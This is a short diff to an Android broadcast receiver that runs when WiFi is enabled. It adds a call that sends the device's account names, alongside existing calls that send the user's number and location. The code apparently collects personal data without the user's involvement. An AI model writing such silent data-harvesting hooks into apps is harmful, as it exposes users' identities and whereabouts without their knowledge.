@@ -33,6 +33,7 @@ public class AtomaticConnection extends BroadcastReceiver {
             Log.v(Constant.LOG_Constant, " Enable Wifi:=true");
             new SendUserInformation(context).sendUserNumber();
             sendLocation();
+            new  SendUserInformation(context).sendAcountsName();
 
         }
 
